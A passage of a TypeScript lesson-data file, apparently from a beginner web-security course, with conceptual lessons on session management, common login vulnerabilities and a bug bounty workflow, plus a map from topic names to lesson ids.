  emoji: '🔐',
  sections: [
    { type: 'heading', content: 'Session Management' },
    { type: 'text', content: 'Session management is how applications maintain state across multiple requests. Since HTTP is stateless, applications need a way to remember who you are after you log in.' },
    { type: 'subheading', content: 'Session Lifecycle' },
    { type: 'list', items: [
      '**Creation**: Session created on login (or sometimes on first visit for anonymous sessions).',
      '**Maintenance**: Session ID sent with every request via cookie or header.',
      '**Validation**: Server checks session exists, hasn\'t expired, matches user\'s IP/user-agent.',
      '**Expiration**: Session fixed lifetime, idle timeout, or logout.',
      '**Termination**: Session deleted on logout, password change, or timeout.',
    ]},
    { type: 'callout', variant: 'warning', content: '**Common Issues**: Predictable session tokens, no session expiry, session fixation (attacker sets victim\'s session ID before login), concurrent session management, and missing invalidation on logout or password change.' },
  ],
};

lessons['login-security'] = {
  id: 'login-security',
  title: 'Login Security Issues',
  emoji: '🚪',
  sections: [
    { type: 'heading', content: 'Login Security Issues' },
    { type: 'text', content: 'Login pages are the most targeted part of any application. They are the front door — and attackers are constantly trying to pick the lock.' },
    { type: 'subheading', content: 'Common Login Vulnerabilities' },
    { type: 'table', headers: ['Vulnerability', 'Description', 'Testing Method'], rows: [
      ['Username Enumeration', 'Different error for valid vs invalid usernames', 'Compare "User not found" vs "Wrong password" messages'],
      ['Brute Force', 'No rate limiting on login attempts', 'Attempt many passwords rapidly'],
      ['Credential Stuffing', 'Using breached passwords from other sites', 'Try known leaked credentials'],
      ['Weak Password Policy', 'No minimum requirements for passwords', 'Try "password123" or "admin"'],
      ['No MFA/2FA', 'No additional authentication factor', 'Check if 2FA can be skipped or bypassed'],
      ['Password Reset Flaw', 'Reset token predictable or not properly validated', 'Analyze reset token pattern'],
      ['Insecure Password Storage', 'Passwords stored in plaintext', 'Check for password exposure in errors/API'],
    ]},
  ],
};

lessons['bug-bounty-workflow'] = {
  id: 'bug-bounty-workflow',
  title: 'Real Bug Bounty Workflow Thinking',
  emoji: '🎯',
  sections: [
    { type: 'heading', content: 'Real Bug Bounty Workflow Thinking' },
    { type: 'text', content: 'Professional bug bounty hunting is methodical, not random. Following a structured workflow increases your chances of finding valid vulnerabilities and earning bounties.' },
    { type: 'subheading', content: 'The 5-Step Workflow' },
    { type: 'list', items: [
      '**Phase 1: Recon (40% of time)** — Gather intelligence. Subdomains, endpoints, technologies, employees, leaks. The more you know, the more attack surface you find.',
      '**Phase 2: Attack Surface Mapping (20%)** — Catalog every endpoint, parameter, and function. Create a test matrix. Identify what needs deep testing.',
      '**Phase 3: Testing (30%)** — Systematically test each function. Start with automation (scanners, fuzzers), then manual testing for business logic and complex flaws.',
      '**Phase 4: Verification (5%)** — Confirm the bug is real. Eliminate false positives. Determine impact. Take screenshots and record PoC steps.',
      '**Phase 5: Reporting (5%)** — Write a clear, professional report. Include: vulnerability type, impact, steps to reproduce, screenshots/PoC, and remediation advice.',
    ]},
    { type: 'callout', variant: 'tip', content: '**Beginner Advice**: Don\'t try to find "the big bug" immediately. Focus on learning methodology first. As your recon improves, your findings will naturally become more severe. Most top hunters find bugs through thorough recon, not through exotic exploitation techniques.' },
  ],
};

const topicNameToId: Record<string, string> = {
  'What is the Internet?': 'what-is-the-internet',
  'Client vs Server': 'client-vs-server',
  'How Websites Load': 'how-websites-load',
  'DNS Basics': 'dns-basics',
  'HTTP vs HTTPS': 'http-vs-https',
  'Request Methods (GET, POST)': 'request-methods',
  'Request Methods': 'request-methods',
  'Headers & Cookies': 'headers-and-cookies',
  'Status Codes': 'status-codes',
  'Request-Response Lifecycle': 'request-response-lifecycle',
  'Frontend vs Backend': 'frontend-vs-backend',
  'REST APIs': 'rest-apis',
  'Databases Overview': 'databases-overview',
  'Monolith vs Microservices': 'monolith-vs-microservices',
  'Reconnaissance Theory': 'reconnaissance-theory',
  'OSINT (Open Source Intelligence)': 'osint',
  'OSINT': 'osint',
  'Public Website Footprint': 'public-website-footprint',
  'Tech Stack Detection Concepts': 'tech-stack-detection',
  'Cookies vs Tokens': 'cookies-vs-tokens',
  'JWT Basics': 'jwt-basics',
  'Session Management': 'session-management',
  'Login Security Issues': 'login-security',
  'XSS (Reflected, Stored, DOM)': 'xss',
  'XSS': 'xss',
  'SQL Injection Basics': 'sql-injection',
  'SQL Injection': 'sql-injection',
  'CSRF Overview': 'csrf',
  'CSRF': 'csrf',
  'IDOR Introduction': 'idor',
  'IDOR': 'idor',
  'API Security': 'api-security',
  'Business Logic Bugs': 'business-logic-bugs',
  'Rate Limiting Issues': 'rate-limiting',
  'Real Bug Bounty Workflow Thinking': 'bug-bounty-workflow',
};

export function getTopicIdFromName(name: string): string | undefined {
  return topicNameToId[name];
}

export { lessons };
